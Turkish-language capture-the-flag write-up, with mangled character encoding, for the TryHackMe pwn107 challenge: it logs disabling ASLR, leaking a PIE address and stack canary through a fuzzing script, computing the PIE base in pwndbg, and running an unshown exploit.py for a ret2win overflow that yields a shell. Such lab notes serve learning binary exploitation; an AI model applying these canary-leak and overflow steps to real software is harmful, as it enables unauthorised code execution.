Ã–zet sÄ±ralama:
1-PIE Taban Adresini Almak: Adreslerin rastgele olduÄŸunu belirttikleri iÃ§in,
PIE taban adresini bulmak iÃ§in bir teknik kullanacaklar.
2-YÄ±ÄŸÄ±n Canary Adresini SÄ±zdÄ±rmak: YÄ±ÄŸÄ±n korumasÄ± ile birlikte yÄ±ÄŸÄ±n canary
adresini sÄ±zdÄ±rmak iÃ§in bir yÃ¶ntem kullanacaklar.
3-Ret2Win: Son olarak, tampon taÅŸmasÄ± kullanarak ret2win iÅŸlevini Ã§aÄŸÄ±racaklar.

Steps:
1. Aslr kapatÄ±lacak:
â””â”€$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
[sudo] password for mark: 0

2. piebase leak iÃ§in FUZZ1.py kullanÄ±lacak. Bu fuzz ile her Ã§alÄ±ÅŸmada drÄŸiÅŸmeyen adres tespit edilecek;
â””â”€$ python3 fuzz.py  
     17: b'0x555555400992\n'
                                                                                                        
â”Œâ”€â”€(markã‰¿haxor)-[~/â€¦/B2B/THM/Pwn101/pwn107]
â””â”€$ python3 fuzz.py
    17: b'0x555555400992\n'

3. Bulunan bu deÄŸiÅŸmeyen bu adres ile piebase adresi hesap edilecek.

â””â”€$ gdb-pwndbg -q pwn107.pwn107
Reading symbols from pwn107.pwn107...
(No debugging symbols found in pwn107.pwn107)
pwndbg: loaded 138 pwndbg commands and 43 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
------- tip of the day (disable with set show-tips off) -------
The set show-flags on setting will display CPU flags register in the regs context panel
pwndbg> break main
Breakpoint 1 at 0x996
pwndbg> r
Starting program: /home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000555555400996 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
*RAX  0x555555400992 (main) â—‚â€” push rbp
*RBX  0x7fffffffdfb8 â€”â–¸ 0x7fffffffe306 â—‚â€” '/home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107'
*RCX  0x7ffff7f9b820 (__exit_funcs) â€”â–¸ 0x7ffff7f9d2e0 (initial) â—‚â€” 0x0
*RDX  0x7fffffffdfc8 â€”â–¸ 0x7fffffffe33d â—‚â€” 0x5245545f5353454c ('LESS_TER')
*RDI  0x1
*RSI  0x7fffffffdfb8 â€”â–¸ 0x7fffffffe306 â—‚â€” '/home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107'
*R8   0x555555400b00 (__libc_csu_fini) â—‚â€” ret 
*R9   0x7ffff7fcf6a0 (_dl_fini) â—‚â€” push rbp
*R10  0x7ffff7fcb878 â—‚â€” 0xc00120000000e
*R11  0x7ffff7fe18c0 (_dl_audit_preinit) â—‚â€” mov eax, dword ptr [rip + 0x1b552]
 R12  0x0
*R13  0x7fffffffdfc8 â€”â–¸ 0x7fffffffe33d â—‚â€” 0x5245545f5353454c ('LESS_TER')
 R14  0x0
*R15  0x7ffff7ffd020 (_rtld_global) â€”â–¸ 0x7ffff7ffe2e0 â€”â–¸ 0x555555400000 â—‚â€” jg 0x555555400047
*RBP  0x7fffffffdea0 â—‚â€” 0x1
*RSP  0x7fffffffdea0 â—‚â€” 0x1
*RIP  0x555555400996 (main+4) â—‚â€” sub rsp, 0x40
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-64 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0x555555400996 <main+4>     sub    rsp, 0x40
   0x55555540099a <main+8>     mov    rax, qword ptr fs:[0x28]
   0x5555554009a3 <main+17>    mov    qword ptr [rbp - 8], rax
   0x5555554009a7 <main+21>    xor    eax, eax
   0x5555554009a9 <main+23>    mov    eax, 0
   0x5555554009ae <main+28>    call   setup                <setup>
 
   0x5555554009b3 <main+33>    mov    eax, 0
   0x5555554009b8 <main+38>    call   banner                <banner>
 
   0x5555554009bd <main+43>    lea    rdi, [rip + 0x2a4]
   0x5555554009c4 <main+50>    call   puts@plt                <puts@plt>
 
   0x5555554009c9 <main+55>    lea    rdi, [rip + 0x2b8]
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ rbp rsp 0x7fffffffdea0 â—‚â€” 0x1
01:0008â”‚         0x7fffffffdea8 â€”â–¸ 0x7ffff7df018a (__libc_start_call_main+122) â—‚â€” mov edi, eax
02:0010â”‚         0x7fffffffdeb0 â€”â–¸ 0x7fffffffdfa0 â€”â–¸ 0x7fffffffdfa8 â—‚â€” 0x38 /* '8' */
03:0018â”‚         0x7fffffffdeb8 â€”â–¸ 0x555555400992 (main) â—‚â€” push rbp
04:0020â”‚         0x7fffffffdec0 â—‚â€” 0x155400040 /* '@' */
05:0028â”‚         0x7fffffffdec8 â€”â–¸ 0x7fffffffdfb8 â€”â–¸ 0x7fffffffe306 â—‚â€” '/home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107'
06:0030â”‚         0x7fffffffded0 â€”â–¸ 0x7fffffffdfb8 â€”â–¸ 0x7fffffffe306 â—‚â€” '/home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107'
07:0038â”‚         0x7fffffffded8 â—‚â€” 0x521dd9f736185b23
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º f 0   0x555555400996 main+4
   f 1   0x7ffff7df018a __libc_start_call_main+122
   f 2   0x7ffff7df0245 __libc_start_main+133
   f 3   0x5555554007aa _start+42
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg> piebase
Calculated VA from /home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107 = 0x555555400000
pwndbg> 

4. Read Ã§aÄŸrÄ±sÄ±nÄ±n olduÄŸu yerde buffer overflow aÃ§Ä±ÄŸÄ± vardÄ±.
Oraya breakpoint koyuyoruz. SonrasÄ±nda 2. adÄ±mda bulduÄŸumuz adresi kullanarak offset bulacaÄŸÄ±z.

0x0000000000000a69 <+215>:   call   0x750 <read@plt>
 pwndbg> breakrva 0xa69
Breakpoint 2 at 0x555555400a69
pwndbg> c
Continuing.
       â”Œâ”¬â”â”¬â”€â”â”¬ â”¬â”¬ â”¬â”Œâ”€â”â”Œâ”€â”â”¬â”Œâ”€â”Œâ”¬â”â”Œâ”€â”
        â”‚ â”œâ”¬â”˜â””â”¬â”˜â”œâ”€â”¤â”œâ”€â”¤â”‚  â”œâ”´â”â”‚â”‚â”‚â”œâ”¤ 
        â”´ â”´â””â”€ â”´ â”´ â”´â”´ â”´â””â”€â”˜â”´ â”´â”´ â”´â””â”€â”˜
                 pwn 107         

You are a good THM player ğŸ˜
But yesterday you lost your streak ğŸ™
You mailed about this to THM, and they responsed back with some questions
Answer those questions and get your streak back

THM: What's your last streak? lol
Thanks, Happy hacking!!
Your current streak: lol


[Few days latter.... a notification pops up]

Hi pwner ğŸ‘¾, keep hackingğŸ‘©ğŸ’» - We miss you!ğŸ˜¢

Breakpoint 2, 0x0000555555400a69 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ REGISTERS / show-flags off / show-compact-regs off ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
*RAX  0x0
 RBX  0x7fffffffdfb8 â€”â–¸ 0x7fffffffe306 â—‚â€” '/home/mark/Desktop/B2B/THM/Pwn101/pwn107/pwn107.pwn107'
*RCX  0x7ffff7ec1190 (write+16) â—‚â€” cmp rax, -0x1000 /* 'H=' */
*RDX  0x200
*RDI  0x0
*RSI  0x7fffffffde80 â—‚â€” 0x0
 R8   0x555555400b00 (__libc_csu_fini) â—‚â€” ret 
 R9   0x7ffff7fcf6a0 (_dl_fini) â—‚â€” push rbp
 R10  0x7ffff7fcb878 â—‚â€” 0xc00120000000e
*R11  0x202
 R12  0x0
 R13  0x7fffffffdfc8 â€”â–¸ 0x7fffffffe33d â—‚â€” 0x5245545f5353454c ('LESS_TER')
 R14  0x0
 R15  0x7ffff7ffd020 (_rtld_global) â€”â–¸ 0x7ffff7ffe2e0 â€”â–¸ 0x555555400000 â—‚â€” jg 0x555555400047
 RBP  0x7fffffffdea0 â—‚â€” 0x1
*RSP  0x7fffffffde60 â—‚â€” 0xa6c6f6c /* 'lol\n' */
*RIP  0x555555400a69 (main+215) â—‚â€” call 0x555555400750
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ DISASM / x86-64 / set emulate on ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º 0x555555400a69 <main+215>           call   read@plt                <read@plt>
        fd: 0x0 (/dev/pts/2)
        buf: 0x7fffffffde80 â—‚â€” 0x0
        nbytes: 0x200
 
   0x555555400a6e <main+220>           nop    
   0x555555400a6f <main+221>           mov    rax, qword ptr [rbp - 8]
   0x555555400a73 <main+225>           xor    rax, qword ptr fs:[0x28]
   0x555555400a7c <main+234>           je     main+241                <main+241>
 
   0x555555400a7e <main+236>           call   __stack_chk_fail@plt                <__stack_chk_fail@plt>
 
   0x555555400a83 <main+241>           leave  
   0x555555400a84 <main+242>           ret    
 
   0x555555400a85                      nop    word ptr cs:[rax + rax]
   0x555555400a8f                      nop    
   0x555555400a90 <__libc_csu_init>    push   r15
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ STACK ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
00:0000â”‚ rsp 0x7fffffffde60 â—‚â€” 0xa6c6f6c /* 'lol\n' */
01:0008â”‚     0x7fffffffde68 â—‚â€” 0x0
... â†“        3 skipped
05:0028â”‚     0x7fffffffde88 â€”â–¸ 0x7ffff7fe6e10 (dl_main) â—‚â€” push rbp
06:0030â”‚     0x7fffffffde90 â—‚â€” 0x0
07:0038â”‚     0x7fffffffde98 â—‚â€” 0xde96d2eee6ebeb00
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ BACKTRACE ]â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
 â–º f 0   0x555555400a69 main+215
   f 1   0x7ffff7df018a __libc_start_call_main+122
   f 2   0x7ffff7df0245 __libc_start_main+133
   f 3   0x5555554007aa _start+42
â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
pwndbg>
pwndbg> x 0x555555400992
0x555555400992 <main>:  0xe5894855
pwndbg> x 0x555555400992 - 0x555555400000
0x992:  Cannot access memory at address 0x992
pwndbg>

5. YukarÄ±da offset 0x992 olarak bulundu.
6. Åimdi sÄ±ra stack canary leak bulmakta.
7. Canary adresinin sonu 00 ile bitermiÅŸ ve ff veya f7 ile baÅŸlamayacak.. Fuzz ile 13. buldu.
â””â”€$ python3 fuzz.py                         
    13: b'0xd6b190b256ee5f00\n'
8. Geriye exploit.py'e bulduÄŸumuz bu leakleri yazÄ±p Ã§alÄ±ÅŸtÄ±rmak kaldÄ±.
â””â”€$ python3 exploit.py
[+] Starting local process './pwn107.pwn107': pid 180823
[*] Canary address: 0xdf4535f29136bb00
[*] Leaked Pie address: 0x555555400992
[*] Piebase address: 0x555555400000
[*] Switching to interactive mode


[Few days latter.... a notification pops up]

Hi pwner ğŸ‘¾, keep hackingğŸ‘©ğŸ’» - We miss you!ğŸ˜¢
This your last streak back, don't do this mistake again
$ ls -al
total 36
drwxr-xr-x  2 mark mark  4096 Feb 17 13:17 .
drwxr-xr-x 10 mark mark  4096 Feb 16 17:27 ..
-rw-r--r--  1 mark mark  1700 Feb 17 13:16 exploit.py
-rw-r--r--  1 mark mark  1403 Feb 17 03:13 fuzz.py
-rw-------  1 mark mark   453 Feb 16 17:33 .gdb_history
-rwxr-xr-x  1 mark mark 12848 Feb 15 22:17 pwn107.pwn107
$ 
